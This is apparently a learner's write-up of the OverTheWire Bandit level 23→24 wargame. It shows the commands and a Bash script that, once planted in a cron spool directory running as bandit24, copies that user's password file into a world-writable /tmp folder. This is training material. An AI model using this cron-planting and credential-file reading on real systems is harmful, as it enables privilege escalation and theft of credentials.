# Bandit Level 23 → 24

# Objective:

Learn how Linux cron jobs execute scheduled scripts as another user, and exploit that behavior to retrieve the password for bandit24 by creating a custom Bash script.


# Commands Used:
```
ssh bandit23@bandit.labs.overthewire.org -p 2220

cat /etc/cron.d/cronjob_bandit23

cat /usr/bin/cronjob_bandit23.sh

mkdir /tmp/myscript

chmod 777 /tmp/myscript

cat > /tmp/myscript/script.sh

chmod +x /tmp/myscript/script.sh

cp /tmp/myscript/script.sh /var/spool/bandit24/foo/

sleep 70

cat /tmp/myscript/password.txt
```
# Script Used
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/myscript/password.txt
 ```

# Solution Summary
```
Examined the cron configuration.
Read and understood the cron execution script.
Created a writable directory in /tmp.
Wrote a Bash script that copies the Bandit24 password into the temporary directory.
Made the script executable.
Copied the script into the cron execution directory.
Waited for the cron job to execute.
Retrieved the password from the output file.
```
# What I Learned
```
How cron jobs work in Linux.
How to inspect scheduled tasks.
How Bash scripts are executed automatically.
Why executable permissions are required.
The importance of directory permissions when another user executes a script.
How scheduled automation is used in Linux system administration.
```
# Troubleshooting

Issue 1:`Permission denied`


Cause: `Tried to create or list files inside the cron spool directory.`

Solution: `Created the script in /tmp and copied it into the cron directory instead.`


Issue 2: `Password file not created`


Cause: `The output directory was not writable by bandit24.`


Solution:`chmod 777 /tmp/myscript`


`This allowed the cron job running as bandit24 to write the password file.`


Issue 3: `SSH Session Disconnected`


Cause: `Session was idle for too long.`


Solution: `Reconnected using SSH and continued from the existing /tmp directory.`



![level23 Proof](</assets/level23.png>)

![level23 Proof](</assets/level23-output.png>)